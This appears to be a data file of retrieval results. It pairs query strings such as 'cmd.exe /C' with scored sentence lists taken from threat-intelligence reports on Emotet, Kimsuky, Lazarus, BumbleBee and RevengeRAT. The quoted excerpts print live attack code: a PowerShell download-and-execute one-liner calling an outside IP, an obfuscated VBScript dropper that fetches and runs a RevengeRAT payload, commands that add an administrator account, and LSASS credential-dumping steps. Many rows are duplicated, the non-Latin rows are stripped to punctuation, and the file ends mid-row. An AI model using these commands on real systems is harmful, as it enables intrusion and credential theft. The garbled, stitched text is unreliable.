cmd.exe /C|0.7784302417153919|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
cmd.exe /C|0.7610348906349725|"['Figure 5: A highly obfuscated XL4 macro.NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tool at its disposal, called Symbexcel, that applies symbolic execution techniques to the analysis of Excel macros.16 Using this tool, we can automatically de-obfuscate the XL4 macros and identify the additional components being downloaded (see Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threefold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The attackers may choose to use multiple hosts to increase the chances to download the payload and improve success rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by running rundll32.exe.', '3.', 'Gain registry persistence by running DllRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC command line is shown Figure 6).', 'The payload is a DLL file, which (unsurprisingly) is the main Emotet DLL.', 'In the case of the Excel document with hash 7c0d0a80e7ebb3af7ce549df78a5a68cbd5debb5, the DLL is 88cf39a587aeb8f075aa0ae23a42e16ce3656e71.']"
cmd.exe /C|1.0|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
cmd.exe /C|0.8089725984772371|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
cmd.exe /C|1.0|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
bat script:|1.0|"['4 GUID is a unique reference number.', 'Its a 128-bit value that is unique not only within an enterprise but also worldwide.', 'Active Directory internally uses GUID to identify objects.', '24 | The Spy Kittens Are Back: Rocket Kitten 2 The second line deletes the script in an attempt to hide the infection.', 'The file, NTUSER.dat{GUID}.exe (SHA-1: 64ba130e627dd85c85d6534e769d239080e068dd, detected by Trend Micro as BKDR_SWRORT.CP) has been dropped prior to launching the tmp.', 'bat script.', 'BKDR_SWRORT.CP is a small downloader that communicates with and downloads files from the IP address, 84.11.146.62.', 'This IP address belongs to an IABG IP range (http://www.iabg.de/), a German satellite communications provider that the attackers have been using for a long time.', '25 | The Spy Kittens Are Back: Rocket Kitten 2ConclusionConclusion The Rocket Kitten Group has been around for a while now.', 'Based on research done by several security companies, including Trend Micro and ClearSky, we can assume that their activities will continue in the near future, as they werent deterred by making their existence and attack methods known.', 'Weve been observing the group for about a year now.']"
bat script:|0.7667219766005908|[]
bat script:|0.7667219766005908|['.', '.', '.', '.', '.', '5 The Bat!', '.', '.', '.', '.', '.']
bat script:|0.777238142744485|['Static information of DLL are shown below: Hash caa24c46089c8953b2a5465457a6c202ecfa83ab bce7a9d3299ade52ec8382c2 Threat Kimsuky second stage Brief DLL used by the Kimsuky group as second stage Description Ssdeep 6144:6lhe64TNUalJMRRfS5mABlakVxOfLnePfcNl6GwUDuL/:6zfeCk IAYfLeXcj6uuL Table 2: AutoUpdate.dll Information The dll is then copied into the folder %AppData%\\\\Roaming\\\\Microsoft\\\\Windows\\\\Defender\\\\ and it is renamed into AutoUpdate.dll.', 'https://blog.yoroi.company/research/the-north-korean-kimsuky-apt-keeps-threatening-south-korea-evolving-its-ttps/ 2/123/4/2020 The North Korean Kimsuky APT keeps threatening South Korea evolving its TTPs Yoroi Blog The AutoUpdate.dll library then gains persistence by setting the following registry key HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\WindowsDefender.', 'The name and the path used by the attacker is absolutely tricky, because they reference to Windows Defender: Figure 3: registry key set for persistence .', 'Furthermore, exploring the content of the folder %AppData%\\\\Local\\\\Temp path, we observed another temporary file created and immediately removed dubbed <random_name>.tmp.bat.', 'By analyzing its contents, we noticed that it is used to delete the initial artifact (scr) and file itself.', 'Figure 4: Content of the bat script.', 'In order to hide the malicious operation and avoid raising suspicion, a legit document is created in the same folder containing the .scr file, the document is named .hwp.', 'Translating its name from Korean to English language, is possible to obtain the CV Form string.', 'The name and other information about the document are the following: Hash d21523b7b8f6584305a0a6a83cd65c8ce0777a42ab781c35aa06c46c91f504b4 Threat Kimsuky legit document Brief Legit document used to divert attention on the malware in hwp extension De scrip tion Ss 192:zXEKVs7kRvm+1FsO2ui/VpIkCnH5QVSV9VahhU:r3YkA+1aJuk deep WQVS9avU Table 3: Information about legit document with .hwp extension As implied by the file name (CV Form), the document contains a CV form with empty fields, as shown in the following figure.', 'https://blog.yoroi.company/research/the-north-korean-kimsuky-apt-keeps-threatening-south-korea-evolving-its-ttps/ 3/123/4/2020 The North Korean Kimsuky APT keeps threatening South Korea evolving its TTPs Yoroi Blog Figure 6: Legit document overview Bypassing AV Detection An interesting behaviour is the explorer.exe injection performed by the AutoUpdate.dll in order to avoid AVs detection.', 'Digging in the malicious code, it is possible to see the methods used to perform this operation.']
bat script:|0.7858675086975017|['The following commands show the basic network and domain information of the environment that has the infected system.', 'The collected information can be used later in lateral movement attacks.', 'If the attack succeeds, the attacker can dominate the systems within the domain.cmd.exe /c ping 11.11.11.1cmd.exe /c ipconfig /allcmd.exe /c query usercmd.exe net group domain admins /domainnet user _smuser white1234!', '@#$cmd.exe net localgroup administrators /add smi140199Jin MinerAnalyzing the ASD log for the infected system shows that before the Lazarus group installed NukeSped, other attackers had already exploited the vulnerability to install Jin Miner.', 'Jin Miner is known as a malware strain distributed through the Log4Shell vulnerability, as shown in theprevious Sophos report.Installed in the path shown above through the powershell command, Jin Miner is a CoinMiner that ultimately mines the Monero coin.MD5131fc4375971af391b459de33f81c2531875f6a68f70bee316c8a6eda9ebf8de47791bf9e017e3001ddc68a7351ca2d67a19c59c4373cadb4556f7e30ddd91ac7ef97450e84211f9f35d45e1e6ae1481URLhttp[:]//185[.]29[.]8[.]18/htroy[.]exehttp[:]//185[.]29[.]8[.]18[:]8888/http[:]//84[.]38[.]133[.]145[:]443/http[:]//84[.]38[.]133[.]16[:]8443/http[:]//iosk[.]org/pms/add[.', ']bat']
to execute Procdump, which was used to dump lsass.|0.8622796375501383|['The threat actor then deployed AnyDesk, which was the only observed persistence mechanism used during the intrusion.', 'The threat actor then started Active Directory discovery usingAdfind.After this activity, the threat actors went silent.', 'Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.The next check in from the threat actors, occurred on the 4th day, where the threat actors again ran VulnRecon, but from the beachhead host instead of the server.', 'AdFind was used again as well.', 'Next, the threat actor transferredSysinternals tool Procdumpover SMB, to the ProgramData folders on multiple hosts in the environment.', 'They then used remote services to execute Procdump, which was used to dump LSASS.', 'At this point, the actors appeared to be searching for more access then they currently had.', 'While they were able to move laterally to workstations and at least one server, it seemed that they had not yet taken control of an account that provided them the access they were seeking, likely a Domain Admin or similarly highly privileged account.After that activity,the threat actors then disappeared until the 7th day, at which time they accessed the server via Anydesk.', 'Again, they executed VulnRecon and then also executedSeatbelt, a red team tool for preforming various host based discovery.On the final day of the intrusion, the 11th day since the initial entry by the threat actor, they appeared to be preparing to act on final objectives.', 'The threat actors used PowerShell to download and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead host.', 'After injecting into various processes, the threat actors executed the PowerShell module Invoke-Kerberoast.']
they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.|0.9752348850021141|['At this point, the actors appeared to be searching for more access then they currently had.', 'While they were able to move laterally to workstations and at least one server, it seemed that they had not yet taken control of an account that provided them the access they were seeking, likely a Domain Admin or similarly highly privileged account.After that activity,the threat actors then disappeared until the 7th day, at which time they accessed the server via Anydesk.', 'Again, they executed VulnRecon and then also executedSeatbelt, a red team tool for preforming various host based discovery.On the final day of the intrusion, the 11th day since the initial entry by the threat actor, they appeared to be preparing to act on final objectives.', 'The threat actors used PowerShell to download and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead host.', 'After injecting into various processes, the threat actors executed the PowerShell module Invoke-Kerberoast.', 'Next, they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.', 'AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run.', 'These batch scripts purposes were to identify all online servers and workstations in the environment, often a precursor to ransomware deployment by creating the target list for that deployment.After the scripts ran, a new Cobalt Strike executable beacon was run on the beachhead.', 'Next, the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.', 'This service account had a weak password, which was most likely cracked offline after being kerberoasted earlier in the intrusion.The threat actors were then evicted from the environment before any final actions could be taken.', 'We assess based on the level of access and discovery activity from the final day, the likely final actions would have been a domain wide ransom deployment.ServicesWe offer multiple services including aThreat Feed servicewhich tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc.']
dumping their LSASS process|0.7625969583139317|"['You can also confirm that the tool is also made in Chinese.', '[Figure 6] Screen when running Goon 8/163.2.6.', 'stealing information The main stealing information is LSASS Dump information and the EML file of a specific account.', ""Depending on the company, it has been confirmed that the program installed with the WMIC command is checked, or the screen image is sent to the attacker's server at regular intervals from a specific victim's PC."", '1) Extract credential information (LSASS Dump) The attacker tried to extract credential information without installing Mimikatz according to the target.', 'This is a method of dumping the Lsass.exe process.', 'Since this dump file contains credential information, tools such as Mimikatz or Pypykatz can obtain the credential information of the PC.', ""For reference, detailed information on Mimikatz can be found in the TI report ' Analysis report on internal network propagation techniques using Mimikatz '."", ""The attacker's method of stealing credential information performed without Mimikatz is as follows."", '1-1) Dumpert Open source Dumpert is a tool that bypasses API hooking and performs according to the OS version.', 'It dumps the lsass.exe process using the MiniDumpWriteDump() API.']"
the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.|0.959968704481569|"['The threat actors used PowerShell to download and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead host.', 'After injecting into various processes, the threat actors executed the PowerShell module Invoke-Kerberoast.', 'Next, they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.', 'AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run.', 'These batch scripts purposes were to identify all online servers and workstations in the environment, often a precursor to ransomware deployment by creating the target list for that deployment.After the scripts ran, a new Cobalt Strike executable beacon was run on the beachhead.', 'Next, the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.', 'This service account had a weak password, which was most likely cracked offline after being kerberoasted earlier in the intrusion.The threat actors were then evicted from the environment before any final actions could be taken.', 'We assess based on the level of access and discovery activity from the final day, the likely final actions would have been a domain wide ransom deployment.ServicesWe offer multiple services including aThreat Feed servicewhich tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc.', 'More information on this service and others can be foundhere.We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under ourSecurity Researcher and Organizationservices.TimelineAnalysis and reporting completed by@0xtornadoand@MetallicHackInitial AccessThe threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usuallydistributedthrough email campaigns.The initial payload namedBC_invoice_Report_CORP_46.iso, is an ISO image that once mounted, lures the user to open adocument.lnkfile which will execute the malicious DLL loader using the following command line:C:\\\\Windows\\\\System32\\\\cmd.exe /c start rundll32 namr.dll,IternalJobRunningEric Zimmermans toolLECmd revealed additional details related to the threat actors.', 'The metadata included TA machines hostname, MAC address, and the LNK document creation date:ExecutionExecution of multiple payloadsThe successful execution ofBumbleBeepayload (namr.dll) resulted in the dropping and the execution of several payloads using multiple techniques.', 'The graph below shows all the payloads dropped by BumbleBee, the way they were executed, and the different processes they injected into:Sysmon File Created event showing wab.exe created by rundll32.exeSysmon Event Code 1 showing wab.exe executed by WMIExecution of Cobalt StrikeThe following PowerShell one-liner was executed fromwab.exeduring day 11, which downloaded obfuscated PowerShell and executed it in memory:C:\\\\Windows\\\\system32\\\\cmd.exe /C powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring(\'http://104.243.33.50:80/a\'))""Since the download took place over an unencrypted HTTP channel, the network traffic was plainly visible.This payload can be deobfuscated using the followingCyberChefrecipe:Regular_expression(\'User defined\',\'[a-zA-Z0-9+/=]{30,}\',true,true,false,false,false,false,\'List matches\') From_Base64(\'A-Za-z0-9+/=\',true) Gunzip() Label(\'Decode_Shellcode\') Regular_expression(\'User defined\',\'[a-zA-Z0-9+/=]{30,}\',true,true,false,false,false,false,\'List matches\') Conditional_Jump(\'\',false,\'\',10) From_Base64(\'A-Za-z0-9+/=\',true) XOR({\'option\':\'Decimal\',\'string\':\'35\'},\'Standard\',false)Once deobfuscated, we can spot theMZREheader, which is part of the default configuration of Cobalt Strike:One of the easiest ways to extract valuable information from this Shellcode is usingDidier Stevens 1768.pytool:The command and control server was hosted on (108.62.12[.]174/dofixifa[.]co).']"
cmd.exe /C rundll32.exe|0.8377247686324156|"['Visual Basic Script hidden behind the web page Its funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities: 3/11Update Copyright: Microsoft Corp.', 'This script is designed to be used only for scheduled tasks(s).', 'There is no extensive error check, and will not dump the output from the Powershell CmdLet.', 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)} These comments are in fact part of the SyncAppvPublishingServer utility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions: Store a base64 encoded version of the RevengeRAT payload into registry key located at HKCU\\\\AppEvents\\\\Values CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ"" Decode and execute of the stored payload Set A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get- ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHide Create and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs, capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']br Set XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t("""" [af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHide 4/11Finally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
cmd.exe /C rundll32.exe|0.8377247686324156|"[']com shormanz[.', ']com verofes[.', ']com : 2/3rundll32 C:\\\\Windows\\\\Tasks\\\\pe.dll,DllRegisterServer C:\\\\Windows\\\\Tasks\\\\pe.dll : 1.', '(EXCEL.EXE, WINWORD.EXE )  (, rundll32.exe, wscript.exe ).', ""2.    '"", 'rundll32.exe.', ': 3/3']"
cmd.exe /C rundll32.exe|0.8377247686324156|"['Home page of the Blogger drop urlBut a deeper inspection of its source code reveals an interesting snippet inserted into an invisible blog post: this ghost article contains VBScript code.Figure 4.', ""Visual Basic Script hidden behind the web pageIts funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities:'Update---------------------------------------------------------------------------------------------' Copyright: Microsoft Corp.'' This script is designed to be used only for scheduled tasks(s).'"", ""There is no extensive error check, and will not dump the output from the Powershell CmdLet.''"", 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)}These comments are in fact part of the SyncAppvPublishingServerutility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions:Store a base64 encoded version of the RevengeRAT payload into registry key located at""HKCU\\\\AppEvents\\\\Values""CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ""Decode and execute of the stored payloadSet A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get-ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHideCreate and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs,capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']brSet XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t(""""[af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHideFinally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
cmd.exe /C rundll32.exe|0.8377247686324156|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
cmd.exe /C rundll32.exe|0.7819681666234273|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
cmd.exe /C rundll32.exe|0.8326195763285533|"['Figure 5: A highly obfuscated XL4 macro.NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tool at its disposal, called Symbexcel, that applies symbolic execution techniques to the analysis of Excel macros.16 Using this tool, we can automatically de-obfuscate the XL4 macros and identify the additional components being downloaded (see Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threefold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The attackers may choose to use multiple hosts to increase the chances to download the payload and improve success rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by running rundll32.exe.', '3.', 'Gain registry persistence by running DllRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC command line is shown Figure 6).', 'The payload is a DLL file, which (unsurprisingly) is the main Emotet DLL.', 'In the case of the Excel document with hash 7c0d0a80e7ebb3af7ce549df78a5a68cbd5debb5, the DLL is 88cf39a587aeb8f075aa0ae23a42e16ce3656e71.']"
cmd.exe /C rundll32.exe|0.7819681666234273|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
cmd.exe /C rundll32.exe|0.7819681666234273|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
Because rundll32.exe executed PowerShell, we can see that rundll32.exe created|0.7795162889370029|"['Visual Basic Script hidden behind the web page Its funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities: 3/11Update Copyright: Microsoft Corp.', 'This script is designed to be used only for scheduled tasks(s).', 'There is no extensive error check, and will not dump the output from the Powershell CmdLet.', 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)} These comments are in fact part of the SyncAppvPublishingServer utility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions: Store a base64 encoded version of the RevengeRAT payload into registry key located at HKCU\\\\AppEvents\\\\Values CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ"" Decode and execute of the stored payload Set A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get- ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHide Create and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs, capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']br Set XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t("""" [af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHide 4/11Finally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
Because rundll32.exe executed PowerShell, we can see that rundll32.exe created|0.7795162889370029|"[']com shormanz[.', ']com verofes[.', ']com : 2/3rundll32 C:\\\\Windows\\\\Tasks\\\\pe.dll,DllRegisterServer C:\\\\Windows\\\\Tasks\\\\pe.dll : 1.', '(EXCEL.EXE, WINWORD.EXE )  (, rundll32.exe, wscript.exe ).', ""2.    '"", 'rundll32.exe.', ': 3/3']"
Because rundll32.exe executed PowerShell, we can see that rundll32.exe created|0.7795162889370029|"['Home page of the Blogger drop urlBut a deeper inspection of its source code reveals an interesting snippet inserted into an invisible blog post: this ghost article contains VBScript code.Figure 4.', ""Visual Basic Script hidden behind the web pageIts funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities:'Update---------------------------------------------------------------------------------------------' Copyright: Microsoft Corp.'' This script is designed to be used only for scheduled tasks(s).'"", ""There is no extensive error check, and will not dump the output from the Powershell CmdLet.''"", 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)}These comments are in fact part of the SyncAppvPublishingServerutility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions:Store a base64 encoded version of the RevengeRAT payload into registry key located at""HKCU\\\\AppEvents\\\\Values""CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ""Decode and execute of the stored payloadSet A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe 